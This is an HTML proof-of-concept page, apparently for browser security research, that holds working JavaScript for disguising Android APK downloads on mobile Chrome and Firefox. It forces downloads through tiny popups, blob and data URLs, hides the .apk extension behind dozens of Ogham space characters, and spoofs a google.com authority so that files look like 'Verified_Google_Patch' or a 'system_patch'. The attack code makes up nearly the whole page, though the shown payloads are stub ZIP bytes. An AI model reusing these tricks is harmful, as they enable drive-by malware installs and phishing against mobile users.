<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Browser Security Research PoC</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
        .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 10px auto; max-width: 500px; border: 1px solid #333; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        h2 { color: #00e676; margin-bottom: 5px; }
        p { color: #bbb; font-size: 14px; margin-bottom: 20px; }
        button { 
            width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 8px; 
            font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 14px;
        }
        .btn-fs { background: #ff5252; color: white; }
        .btn-blob { background: #448aff; color: white; }
        .btn-ui { background: #ffd740; color: #000; }
        .btn-auth { background: #ffffff; color: #000; }
        button:hover { opacity: 0.8; transform: translateY(-2px); }
        #log { 
            font-family: 'Cascadia Code', monospace; background: #000; color: #00e676; 
            padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px;
            text-align: left; font-size: 11px; border: 1px solid #00e676;
            overflow-x: auto; white-space: pre-wrap;
        }
    </style>
</head>
<body>

    <h2>Security Research PoC</h2>
    <p>Testing Origin & UI Attribution on Mobile Browsers</p>

    <div class="card">
        <button class="btn-fs" onclick="runHybridFS()">1. Hybrid FileSystem (Chrome)</button>
        <button class="btn-blob" onclick="runBlobContext()">2. Blob URL Context</button>
        <button class="btn-ui" onclick="runSpaceInjection()">3. UI Space Injection</button>
        <button class="btn-auth" onclick="runAuthInjection()">4. Authority Injection (Firefox Fixed)</button>
    </div>

    <div id="log">Status: Awaiting action...</div>

    <script>
        const logger = document.getElementById('log');
        const updateLog = (msg) => {
            const time = new Date().toLocaleTimeString();
            logger.innerText += `\n[${time}] ${msg}`;
            console.log(`[${time}] ${msg}`);
        };

        function requestFS() {
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
        }

        // --- 1. HYBRID FILESYSTEM (Target: Chromium Android) ---
        function runHybridFS() {
            updateLog("Initializing FileSystem API...");
            window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
            if (!window.requestFileSystem) return updateLog("Error: FileSystem API not supported.");

            window.requestFileSystem(window.TEMPORARY, 1024*1024, (fs) => {
                fs.root.getFile('update.apk', { create: true }, (fileEntry) => {
                    fileEntry.createWriter((fileWriter) => {
                        // Minimal ZIP/APK Header to avoid text-sniffing
                        const blob = new Blob([new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00])], { type: 'application/vnd.android.package-archive' });
                        fileWriter.onwriteend = () => {
                            const win = window.open("", "_blank", "width=1,height=1");
                            if (win) {
                                updateLog("Window opened. Triggering FS download...");
                                const a = win.document.createElement("a");
                                a.href = fileEntry.toURL();
                                a.download = "Security_Update.apk";
                                win.document.body.appendChild(a);
                                a.click();
                                setTimeout(() => win.close(), 2000);
                            }
                        };
                        fileWriter.write(blob);
                    });
                });
            }, (err) => updateLog("FS Error: " + err.message));
        }

        // --- 2. BLOB URL CONTEXT ---
        function runBlobContext() {
            updateLog("Creating Blob Context...");
            const html = `
                <script>
                    const a = document.createElement("a");
                    // Minimal APK Magic Bytes
                    a.href = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAA=";
                    a.download = "Chrome_Fix.apk";
                    a.click();
                    setTimeout(() => window.close(), 5000);
                <\/script>
            `;
            const blob = new Blob([html], {type: 'text/html'});
            const url = URL.createObjectURL(blob);
            window.open(url, "_blank");
            updateLog("Blob window triggered.");
        }

        // --- 3. UI SPACE INJECTION ---
        function runSpaceInjection() {
            updateLog("Running Space Injection...");
            requestFS();
            // Karakter Ogham Space (\u1680) untuk mengelabui UI download manager
            const fakeName = "Verified_Google_Patch" + "\u1680".repeat(50) + ".apk";
            setTimeout(() => {
                const a = document.createElement("a");
                a.href = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAA=";
                a.download = fakeName;
                a.click();
            }, 1000);
        }

        // --- 4. AUTHORITY INJECTION (Optimized for Firefox) ---
        function runAuthInjection() {
            updateLog("Running Authority Injection...");
            requestFS();
            
            // Payload: Base64 dari header file ZIP/APK valid (Magic Bytes: PK..)
            // Ini mencegah Firefox mendeteksi file sebagai plain-text
            const apkPayload = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";

            setTimeout(() => {
                const a = document.createElement("a");
                // Menggunakan spoofing authority di dalam skema data (khusus untuk riset Chromium)
                // Namun isi data (MIME & Payload) sudah diperbaiki agar Firefox tidak mengubahnya ke .txt
                a.href = "data:/\\\\\\/.google.com/application/vnd.android.package-archive;base64," + apkPayload;
                a.download = "system_patch.apk";
                
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                updateLog("Download triggered. Check file extension.");
            }, 1000);
        }
    </script>
</body>
</html>
